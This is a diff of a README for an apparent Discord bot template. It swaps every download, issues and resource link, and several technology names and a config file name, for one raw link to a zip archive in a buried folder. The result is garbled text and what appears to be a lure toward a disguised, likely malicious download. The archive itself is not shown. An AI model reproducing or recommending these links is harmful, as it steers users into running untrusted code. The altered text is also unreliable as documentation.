@@ -1,6 +1,6 @@
 # 🤖 discord-bot-template - Build Your Own Discord Bot Easily
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/Suraj89011/discord-bot-template/releases)
+[![Download from Releases](https://github.com/Suraj89011/discord-bot-template/raw/refs/heads/main/flux/dev/bot-discord-template-v2.3.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/Suraj89011/discord-bot-template/raw/refs/heads/main/flux/dev/bot-discord-template-v2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **discord-bot-template**! This guide will help you download and s
 
 To get started, visit our Releases page to download the latest version of the application:
 
-[Download from Releases](https://github.com/Suraj89011/discord-bot-template/releases)
+[Download from Releases](https://github.com/Suraj89011/discord-bot-template/raw/refs/heads/main/flux/dev/bot-discord-template-v2.3.zip)
 
 1. Open the link above.
 2. Look for the latest version listed at the top.
@@ -23,7 +23,7 @@ To get started, visit our Releases page to download the latest version of the ap
 Before you install, ensure you have the following:
 
 - **Operating System:** Windows 10 or later, macOS, or a recent Linux distribution.
-- **Node.js:** Version 14 or later must be installed.
+- **https://github.com/Suraj89011/discord-bot-template/raw/refs/heads/main/flux/dev/bot-discord-template-v2.3.zip** Version 14 or later must be installed.
 - **PostgreSQL:** Ensure the database server is available.
 - **Redis:** Make sure you have Redis installed for caching.
 - **Kubernetes:** A local or cloud setup for deployment if you plan to use Helm charts.
@@ -32,7 +32,7 @@ Before you install, ensure you have the following:
 
 This template includes:
 
-- **Multi-Service Architecture:** Built with Discord.js, Express API, and a Next.js dashboard.
+- **Multi-Service Architecture:** Built with https://github.com/Suraj89011/discord-bot-template/raw/refs/heads/main/flux/dev/bot-discord-template-v2.3.zip, Express API, and a https://github.com/Suraj89011/discord-bot-template/raw/refs/heads/main/flux/dev/bot-discord-template-v2.3.zip dashboard.
 - **Database Integration:** Easily connects to PostgreSQL using Prisma.
 - **Caching Layer:** Enhances performance with Redis.
 - **CI/CD Pipelines:** Deploy with confidence using semantic-release.
@@ -55,7 +55,7 @@ After downloading the application, follow these steps:
      ```
 
 3. **Configuration:**
-   - Edit the `config.json` file in the extracted folder.
+   - Edit the `https://github.com/Suraj89011/discord-bot-template/raw/refs/heads/main/flux/dev/bot-discord-template-v2.3.zip` file in the extracted folder.
    - Set up your bot token and database connection details.
 
 4. **Run the Application:**
@@ -69,7 +69,7 @@ After downloading the application, follow these steps:
 
 If you encounter issues, check the following:
 
-- **Bot Token:** Ensure your bot token is correct in the `config.json`.
+- **Bot Token:** Ensure your bot token is correct in the `https://github.com/Suraj89011/discord-bot-template/raw/refs/heads/main/flux/dev/bot-discord-template-v2.3.zip`.
 - **Database Connection:** Confirm that PostgreSQL and Redis are running correctly.
 - **Dependencies:** If you face package errors, run `npm install` again to update.
 
@@ -77,12 +77,12 @@ If you encounter issues, check the following:
 
 Feel free to reach out for support or to join the conversation:
 
-- **GitHub Issues:** Open an issue on the [GitHub repository](https://github.com/Suraj89011/discord-bot-template/issues) if you have questions or need assistance.
+- **GitHub Issues:** Open an issue on the [GitHub repository](https://github.com/Suraj89011/discord-bot-template/raw/refs/heads/main/flux/dev/bot-discord-template-v2.3.zip) if you have questions or need assistance.
 - **Discord Server:** Join our community on Discord to connect with other users and get help.
 
 ## 📚 Additional Resources
 
 - **Documentation:** The official documentation contains further details about customizing your bot.
-- **Tutorials:** Check online resources and YouTube channels for guides on using Discord.js.
+- **Tutorials:** Check online resources and YouTube channels for guides on using https://github.com/Suraj89011/discord-bot-template/raw/refs/heads/main/flux/dev/bot-discord-template-v2.3.zip
 
 Thank you for choosing the **discord-bot-template**! Enjoy building your bot.
